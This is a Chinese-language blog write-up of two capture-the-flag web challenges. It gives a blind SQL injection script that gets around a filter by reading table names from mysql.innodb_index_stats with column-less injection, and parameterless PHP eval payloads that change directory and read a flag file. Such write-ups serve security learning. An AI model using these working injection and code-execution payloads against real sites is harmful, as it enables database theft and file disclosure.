<!DOCTYPE html>
<html lang="zh-CN">










<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="/favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="description" content="">
    <meta name="author" content="chuddy">
    <meta name="keywords" content="">
    <title>上海市大学生网络安全大赛部分web题解 ~ chuddy&#39;s Blog</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
    
        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
    
</head>

<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
<div class="container">
    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ml-auto text-center">
            
            <li class="nav-item">
                <a class="nav-link" href="/">Home</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/archives/">Archives</a>
            </li>
            
        </ul>
    </div>
</div>


</nav>
    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
    <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
        <div class="container text-center white-text wow fadeInUp">
            <p class="h2">上海市大学生网络安全大赛部分web题解</p>
            <br>
            
            <p>Sunday, November 3rd 2019, 12:13 am</p>
            
        </div>
        </div>
    </div>
    </div>
  </header>

  <main>
  
  <div class="container-fluid">
    <div class="row">
        <div class="col-md-8 offset-md-2 ">
            <div class="post-content py-5 z-depth-3 main">
                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这周六有这个比赛，学到了一个骚姿势，在这里记录一下。<br><a id="more"></a></p>
<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>题目是easysql，看到这个题目感觉问题不是这简单。</p>
<p>打开题目发现是一个未完成的页面，发现可能存在sql注入。<br><a href="https://imgchr.com/i/KOKE0f" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/03/KOKE0f.md.png" alt="KOKE0f.md.png"></a></p>
<p>通过简单的尝试我测试出一种绕过的方式： <a href="http://47.105.183.208:29898/article.php?id=123%2527%7C%7C(1" target="_blank" rel="noopener">http://47.105.183.208:29898/article.php?id=123%27||(1)%23</a>%2523)<br><a href="https://imgchr.com/i/KOKeAS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/03/KOKeAS.md.png" alt="KOKeAS.md.png"></a></p>
<p>继续通过测试发现过滤了一些关键字符串<code>,</code>,<code>or</code>,<code>union select</code>等字符串，让人很头大，虽然能够构造出得到库名的方法<code>http://47.105.183.208:29898/article.php?id=123%27||(database()&lt;&#39;c&#39;)%23</code><br>但是因为过滤了<code>or</code>这个关键的字符串，没有办法通过mysql的information的表来获取其他表的名字，但是查到了这个版本信息为： 5.6.46</p>
<p>当Mysql&gt;5.6.x时</p>
<p>在Mysql中，存储数据的默认引擎分为两类。一类是在5.5.x之前的MyISAM数据存储引擎，另一类是5.5.x版本后的innodb引擎。并且mysql开发团队在5.5.x版本后将innodb作为数据库的默认引擎。</p>
<p>而在mysql 5.6.x版本起，innodb增添了两个新表，一个是innodb_index_stats,另一个是innodb_table_stats。查阅官方文档，其对这两个新表的解释如下图：</p>
<p>从官方文档我们可以发现两个有用的信息：</p>
<ol>
<li>从5.6.x版本开始，innodb_index_stats和innodb_table_stats数据表时自动设置的。</li>
<li>两个表都会存储数据库和对应的数据表。</li>
</ol>
<p>唯一遗憾的是没有字段名</p>
<p>这个两个表存储了相应的数据表名等信息，我们可以通过这个表来弥补information表的缺陷。<br>因此我们可以构造<code>http://47.105.183.208:29898/article.php?id=123%27||((select group_concat(distinct table_name) from mysql.innodb_index_stats)&lt;&#39;0&#39;)%23</code>来进行盲注可以得到相应的数据表：<code>article,fl111aa44a99g</code></p>
<p>由于我们无法知道这里的列明，所以可以选择无列名注入：</p>
<pre><code>http://47.105.183.208:29898/article.php?id=123%27||(substr((select c from (select * from (select 1 `a`)m join (select 0 `i`)o join (select 2 `c`)n  where 0 union/**/select * from fl111aa44a99g)x) from 1)&lt;&#39;0&#39;)%23
</code></pre><p>可以注出flag。</p>
<p>注入脚本为：</p>
<pre><code>import requests

url = &quot;http://47.105.183.208:29898/article.php?id=123%27||&quot;

sql_str =&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-}{~!@$%^&amp;*()_&quot;

flag = &quot;&quot;
for i in range(1,40):
    for j in range(1,len(sql_str)):
        # payload =&quot;(database()&lt;&#39;&quot;+flag+sql_str[j-1:j]+&quot;&#39;)%23&quot;  # database  cccttffff
        # payload =&quot;(version()&lt;&#39;&quot;+flag+sql_str[j-1:j]+&quot;&#39;)%23&quot;  # version  5.6.46
        # payload =&quot;(substr((select group_concat(distinct table_name) from mysql.innodb_index_stats) from &quot;+str(i)+&quot;)&lt;&#39;&quot;+str(sql_str[j-1:j])+&quot;&#39;)%23&quot;  #   article,fl111aa44a99g
        payload =&quot;(substr((select c from (select * from (select 1 `a`)m join (select 0 `i`)o join (select 2 `c`)n  where 0 union/**/select * from fl111aa44a99g)x) from &quot;+str(i)+&quot;)&lt;&#39;&quot;+sql_str[j-1:j]+&quot;&#39;)%23&quot;  #   article,flaaag
        res = requests.get(url=url+payload)
        print url+payload
        # print res.text
        # exit()
        if &#39;2333333333333&#39;  in res.text:
            flag += str(sql_str[j-2:j-1])
            print flag
            break


</code></pre><h3 id="学到的骚姿势"><a href="#学到的骚姿势" class="headerlink" title="学到的骚姿势"></a>学到的骚姿势</h3><p>这里学会了利用<code>innodb_table_stats</code>来注入表名。当过滤了<code>or</code>时可以利用这个表注出表名，再配合无列名注入，注出数据。</p>
<h2 id="decade"><a href="#decade" class="headerlink" title="decade"></a>decade</h2><p>打开链接通过源代码，发现了<code>/code</code>这个地址 并且知道flag在当前目录下测试知道为<code>index.php</code>  访问<code>/code</code>得到：</p>
<pre><code> &lt;?php
highlight_file(__FILE__);
$code = $_GET[&#39;code&#39;];
if (!empty($code)) {
        if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
            if (preg_match(&#39;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
                    echo &#39;bye~&#39;;
                } else {
                    eval($code);
                }
            }
        else {
            echo &quot;No way!!!&quot;;
        }
}else {
        echo &quot;No way!!!&quot;;
    }
No way!!!
</code></pre><p>发现这道题和byteCTF中的一道题目特别相似，是无参数rce,参考了大佬的做法。</p>
<p>第一个正则<code>if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code))</code>;意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）。就是所谓的无参数RCE。</p>
<p>第二个正则则是过滤了一些字符，限制了我们的代码执行。</p>
<p>我们则需要通过<code>eval($code);</code>来读取flag内容，flag在index.php里面，而code.php则在<code>/code/code.php</code>里面，因此我们需要跨目录到上级目录。</p>
<p>第一步：</p>
<p>发现读文件的函数，我们发现<code>file_get_contents</code>、<code>readfile</code>等常规的读文件的函数都被ban了，通过尝试我发现了一个file()函数。<br><a href="https://imgchr.com/i/MVbI2j" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MVbI2j.md.png" alt="MVbI2j.md.png"></a></p>
<p>file() 将文件作为一个数组返回。数组中的每个单元都是文件中相应的一行。既然是一个数组，我们可以用serialize序列化函数来转成一个字符串。就可以得到这个文件的所有内容了。</p>
<p>那就可以<code>echo(serizalize(file()))</code>读取文件内容了，就差构造文件名。</p>
<p>第二步：</p>
<p>最重要获取文件的目录了,<br>参考大佬的payload:<br><strong>crypt(serialize(array()))</strong><br>首先定义一个数组，然后对其进行序列化的操作，输出为一个字符串，这是常规操作。然后就用到了一个非常关键的函数<code>crypt()</code></p>
<p><a href="https://imgchr.com/i/MVvWaq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MVvWaq.md.png" alt="MVvWaq.md.png"></a><br>说起来很复杂 , 仅需要知道它可以返回一个加密字符串。<br>多次尝试之后发现，利用crypt返回一个加密的字符串，加密的字符串末尾有几率出现一个<code>.</code>。基本上是以<code>.  /  0  1</code>这些为结尾。以<code>$</code>开头。</p>
<p>因为加密字符串的 “ . “ 可能会出现在末尾 . 这里很容易想到 用strrev()函数来反转字符串，然后利用<code>chr(ord())</code> 这个组合，将<code>.</code>给取出来</p>
<pre><code> ord() : 解析 string 二进制值第一个字节为 0 到 255 范围的无符号整型类型( 不严禁的说就是将字符串第一个字符转换为 ASCII 编码 )

 chr() : 返回相对应于 ASCII 所0指定的单个字符 , 该函数与 ord() 是对应的~


 strrev() : 反转字符串
</code></pre><p>可以利用<code>chr(ord(strrev(crypt(serialize(array())))))</code>得到<code>.</code></p>
<p><img src="https://s2.ax1x.com/2019/11/08/MZSWdA.png" alt="MZSWdA.png"></p>
<p>由于<code>scandir(getcwd())</code>中的<code>getcwd()</code>这个函数被过滤了，我们可以用<code>scandir(&#39;.&#39;)</code>来代替</p>
<p><img src="https://s2.ax1x.com/2019/11/08/MZ9gUA.png" alt="MZ9gUA.png"></p>
<p>有了 “ . “ , 就可以利用 <code>scandir()</code> 和 <code>next()</code> 获得 “ .. “ 了 </p>
<p><a href="https://imgchr.com/i/MZpleH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZpleH.md.png" alt="MZpleH.md.png"></a></p>
<p>再利用chdir()函数修改当前目录。</p>
<pre><code> chdir() : 将 PHP 的当前目录改为指定目录 . 
</code></pre><p>然后再重复上面的操作：<br>var_dump(scandir(chr(ord(strrev(crypt(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array()))))))))))))));</p>
<p><a href="https://imgchr.com/i/MZATbT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZATbT.md.png" alt="MZATbT.md.png"></a></p>
<p>原理就是先切换到flag所在的目录，然后再通过<code>crypt()</code>函数来对字符串加密得到<code>.</code>然后利用<code>scandir</code>可以得到flag所在的目录的文件名。</p>
<p>猜测文件应该再最后一个利用<code>end</code>来获取文件名，再利用<code>file()</code>来读文件，由于<code>var_dump()</code>被过滤了，采用<code>serialize</code>利用<code>echo</code>输出文件</p>
<p>payload:</p>
<pre><code>/code.php?code=echo(serialize(file(end(scandir(chr(ord(strrev(crypt(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))))))))));
</code></pre><p><a href="https://imgchr.com/i/MZVnp9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZVnp9.md.png" alt="MZVnp9.md.png"></a><br><a href="https://imgchr.com/i/MZV7h4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZV7h4.md.png" alt="MZV7h4.md.png"></a></p>
<h3 id="学到获取-骚姿势"><a href="#学到获取-骚姿势" class="headerlink" title="学到获取.骚姿势"></a>学到获取.骚姿势</h3><h4 id="Math函数"><a href="#Math函数" class="headerlink" title="Math函数"></a>Math函数</h4><p>大佬的payload:<br><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code></p>
<p>核心思路是 : phpversion() 函数会返回当前PHP的版本号 , 然后可以用 floor() 函数取第一位的数值，只会是5或者7。</p>
<p>有了数字 , 就可以通过各种数学运算拿到数字46 , 也就是ASCII字符 “ . “ .(膜一波师傅们tql)。</p>
<p>我试了一下，发现无论是5.x.x还是7.x.x都可以通过这和获取46这个数字。<br><img src="https://s2.ax1x.com/2019/11/08/MZmLcj.png" alt="MZmLcj.png"></p>
<p>利用到的函数：</p>
<pre><code>floor() : 返回不大于 x 的下一个整数 , 简单的说就是向下取整

sqrt() : 返回一个数字的平方根

tan() : 返回一个数字的正切

cosh() : 返回一个数字的双曲余弦

sinh() : 返回一个数字的双曲正弦

ceil() : 返回不小于一个数字的下一个整数 , 也就是向上取整
</code></pre><p>通过 <code>chr()</code> 函数就可以返回 ASCII 编码为 46 的字符 , 也就为 “ . “ , 后面的步骤就和之前一样 ,<br>跳转到根目录<code>chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))</code><br> 然后读取 index.php 文件。这里需要使用<code>if</code>函数来确保</p>
<p>测试代码：</p>
<pre><code>&lt;?php

 if(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))))var_dump(file(end(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))));
</code></pre><p><a href="https://imgchr.com/i/MZlN9K" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZlN9K.md.png" alt="MZlN9K.md.png"></a></p>
<p>我们可以看到这个字符串很长,如果我们不想利用if函数，我们可以利用time()+localtime()函数来实现操作。</p>
<pre><code>time() : 返回自从 Unix 纪元( 格林威治时间 1970 年 1 月 1 日 00:00:00 )到当前时间的秒数 , 也就是返回一个时间戳

localtime() : 以数值数组和关联数组的形式输出本地时间 . 
</code></pre><p>其中localtime关联数组的键名如下：</p>
<ul>
<li>[tm_sec] - 秒数</li>
<li>[tm_min] - 分钟数</li>
<li>[tm_hour] - 小时</li>
<li>[tm_mday] - 月份中的第几天</li>
<li>[tm_mon] - 年份中的第几个月，从 0 开始表示一月份</li>
<li>[tm_year] - 年份，从 1900 开始</li>
<li>[tm_wday] - 星期中的第几天 (Sunday=0)</li>
<li>[tm_yday] - 年中的第几天</li>
<li>[tm_isdst] - 夏令时当前是否生效</li>
</ul>
<pre><code>localtime() 数组，可以提取出秒数的值，用chr转换为字符串 在第46秒时提取，可以获得&quot;.&quot;

localtime() 的第一个参数默认为时间戳 , 也就是 time()的返回值 .

time() 的参数为 void 也就是说引入任意的参数都不会影响 , 其输出为当前的时间戳
</code></pre><p>payload:<br><code>var_dump(file(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</code></p>
<p>可以写一个脚本一直跑，在每一分钟的46秒都可以读取到flag<br><a href="https://imgchr.com/i/MZ8xbQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZ8xbQ.md.png" alt="MZ8xbQ.md.png"></a></p>
<h4 id="localeconv-函数"><a href="#localeconv-函数" class="headerlink" title="localeconv() 函数"></a>localeconv() 函数</h4><p>核心思路：<code>localeconv() 函数</code></p>
<pre><code>localeconv() : 返回一个包含本地化数字和货币格式设置信息的关联数组 . 
</code></pre><pre><code>➜  code php -r &quot;var_dump(localeconv());&quot;
array(18) {
  [&quot;decimal_point&quot;]=&gt;
  string(1) &quot;.&quot;
  [&quot;thousands_sep&quot;]=&gt;
  string(0) &quot;&quot;
  [&quot;int_curr_symbol&quot;]=&gt;
  string(0) &quot;&quot;
  [&quot;currency_symbol&quot;]=&gt;
  string(0) &quot;&quot;
  [&quot;mon_decimal_point&quot;]=&gt;
  string(0) &quot;&quot;
  [&quot;mon_thousands_sep&quot;]=&gt;
  string(0) &quot;&quot;
  [&quot;positive_sign&quot;]=&gt;
  string(0) &quot;&quot;
  [&quot;negative_sign&quot;]=&gt;
  string(0) &quot;&quot;
  [&quot;int_frac_digits&quot;]=&gt;
  int(127)
  [&quot;frac_digits&quot;]=&gt;
  int(127)
  [&quot;p_cs_precedes&quot;]=&gt;
  int(127)
  [&quot;p_sep_by_space&quot;]=&gt;
  int(127)
  [&quot;n_cs_precedes&quot;]=&gt;
  int(127)
  [&quot;n_sep_by_space&quot;]=&gt;
  int(127)
  [&quot;p_sign_posn&quot;]=&gt;
  int(127)
  [&quot;n_sign_posn&quot;]=&gt;
  int(127)
  [&quot;grouping&quot;]=&gt;
  array(0) {
  }
  [&quot;mon_grouping&quot;]=&gt;
  array(0) {
  }
}
</code></pre><p>可以看到这个数组的第一位就是<code>.</code><br>然后可以利用函数将<code>.</code>取出来  <code>current函数</code>和<code>pos函数</code>都可以完成操作</p>
<pre><code>➜  code php -r &quot;var_dump(current(localeconv()));&quot;
string(1) &quot;.&quot;
➜  code php -r &quot;var_dump(pos(localeconv()));&quot;
string(1) &quot;.&quot;
➜  code
</code></pre><p>然后的操作就和第一种方法一样了。可以使用if函数，或者利用time()+localtime()函数来实现操作。</p>
<h4 id="crypt-函数"><a href="#crypt-函数" class="headerlink" title="crypt()函数"></a>crypt()函数</h4><p>首先定义一个数组 , 然后对其进行序列化操作 , 输出序列化字符串 , 这里没什么问题 . 然后就用到一个非常关键的函数 : <strong><code>crypt()</code></strong>这个函数会返回一个加密的字符串。 这些字符串常以<code>/ . 0 1</code>结尾，配合<code>chr(ord(strrev()))</code>可以得到<code>.</code>。然后就时跳目录，读取flag<br>payload:<br><code>echo(serialize(file(end(scandir(chr(ord(strrev(crypt(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))))))))));</code></p>

                <hr>
                <div>
                    <p>
                         
                        <span class="badge badge-light">#&nbsp;writeup</span>
                        &nbsp;
                        
                    </p>
                </div>
                <br>
                
            </div>
        </div>
        <div class="d-none d-md-block col-md-2">
            
  <div id="toc" class="py-5">
    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
    <div id="tocbot"></div>
  </div>

        </div>
    </div>        
</div>

<br><br><br>

<!-- Comments -->
<div class="comments" id="comments">
 
</div>
  
  </main>

<footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
  </div>
</footer>

  <!-- SCRIPTS -->
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
  <script src="/js/main.js"></script>
  
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    
    <script src="/js/post.js"></script>
    
      <script src="/js/plugins/prettify.js"></script>
      <script>
          $(document).ready(function(){
              $('pre').addClass('prettyprint linenums');
              prettyPrint();
          })
      </script>
    
  
</body>
</html>